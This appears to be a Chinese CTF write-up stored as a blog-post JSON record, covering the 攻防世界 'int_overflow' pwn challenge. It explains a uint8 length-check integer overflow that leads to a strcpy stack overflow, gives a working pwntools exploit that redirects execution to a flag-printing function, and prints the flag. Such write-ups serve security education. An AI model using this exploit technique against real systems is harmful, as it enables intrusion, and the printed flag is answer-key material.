{"title":"攻防世界 int_overflow","slug":"攻防世界pwn-int_overflow","date":"2020-05-08","updated":"2020-05-08","comments":true,"path":"api/posts/54610.json","excerpt":null,"cover":"https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png","covers":["https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png","https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png","https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png","https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png","https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png"],"content":"<h3 id=\"checksec- 查看保护机制\"><a href=\"#checksec- 查看保护机制\" class=\"headerlink\" title=\"checksec 查看保护机制\"></a>checksec 查看保护机制</h3><p><img src=\"https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png\" alt=\"捕获.PNG\"></p>\n<p>可直接使用栈溢出；基地址不变化；栈中数据有执行权限；</p>\n<h3 id=\"分析思路\"><a href=\"# 分析思路\" class=\"headerlink\" title=\"分析思路\"></a>分析思路 </h3><p>32 位文件，按流程查看程序，main() 无突破点。</p>\n<p>进入 login(), 限制 username 长度最大 0x19; 限制 passwd 长度最大 0x199；</p>\n<p>进入 check_passwd()，v3 存储 passwd 长度，满足 if 语句 3&lt;v3&lt;=8 可跳到 else 语句。</p>\n<blockquote>\n<p>此处有突破点：v3 类型为 unsigned __int8,，取值范围 0~255，而 v3 存储的 passwd 最大为 0x199, 即 409. 远大于 v3 取值范围。此处为典型整数溢出。</p>\n</blockquote>\n<p>综上:if 语句中的 v3 范围为（3,8]或[259,264] （最大为 255，若使其溢出，则需再加四字节，__int8 是指 8bit）</p>\n<p>溢出之后到达 else 语句，函数返回  strcpy(dest,s)，dest 为字符串拷贝目的栈，长度为 0x14。</p>\n<p><img src=\"https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png\" alt=\"17627983-0f96bbadb310adc5.png\"></p>\n<p>在字符串中发现 cat flag, 属于函数 what_is_this()，地址为 0x0804868B.</p>\n<h3 id=\"攻击思路\"><a href=\"# 攻击思路\" class=\"headerlink\" title=\"攻击思路\"></a>攻击思路 </h3><p> 可以利用栈溢出，令 passwd 直接覆盖 dest, 直接使函数返回 what_is_this()。</p>\n<p>在字符拷贝过程中，输入 0x14 个字符，可覆盖函数返回地址，具体是否为 0x14 个字符，现在查看汇编语言：</p>\n<p><img src=\"https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png\" alt=\"17627983-255df211907024ca.png\"></p>\n<p><img src=\"https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png\" alt=\"17627983-73596713043662d6.png\"></p>\n<p>在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入 ebp 变量，在函数结尾存在 leave 指令，在 32 位程序中，leave 指令等于 mov esp,ebp 和 pop ebp。即：<strong>在覆盖函数返回地址前，还有一次出栈操作，数值 4 字节。即覆盖之前还需将这 4 字节覆盖。</strong>随机选取数值 262.<br>（what_is_this()函数的地址为 4 字节）</p>\n<p>262-0x14-4-4=234</p>\n<p>或者，我在 gdb 中调试程序，在 strcpy 下断点，passwd 填上‘a’*262，观察到 ebp 值为 4 字节。</p>\n<p><img src=\"https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png\" alt=\"捕获.PNG\"></p>\n<p>exp:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import*</span><br><span class=\"line\">sh&#x3D;remote(&#39;111.198.29.45&#39;,39118)</span><br><span class=\"line\">sh.recvuntil(&#39;Your choice:&#39;)</span><br><span class=\"line\">flag&#x3D;0x0804868B</span><br><span class=\"line\">sh.sendline(&#39;1&#39;)</span><br><span class=\"line\">sh.recvuntil(&#39;username:&#39;)</span><br><span class=\"line\">sh.sendline(&#39;z&#39;)</span><br><span class=\"line\">sh.recvuntil(&#39;passwd:&#39;)</span><br><span class=\"line\">payload&#x3D;&#39;a&#39;*0x14+&#39;aaaa&#39;+p32(flag)+&#39;a&#39;*234</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}</p>\n","url":"/posts/54610/","min2read":2,"word4post":504,"prev_post":{"title":"攻防世界 string","url":"/posts/54486/"},"next_post":{"title":"攻防世界 cgpwn2","url":"/posts/1776/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"checksec- 查看保护机制\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">checksec 查看保护机制</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"分析思路\" href = \"#\"><span class=\"toc-number\">2.</span> <span class=\"toc-text\">分析思路 </span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"攻击思路\" href = \"#\"><span class=\"toc-number\">3.</span> <span class=\"toc-text\">攻击思路 </span></a></li></ol>","categories":[],"tags":[{"name":"pwn","path":"api/tags/pwn.json","url":"/tags/pwn/"}]}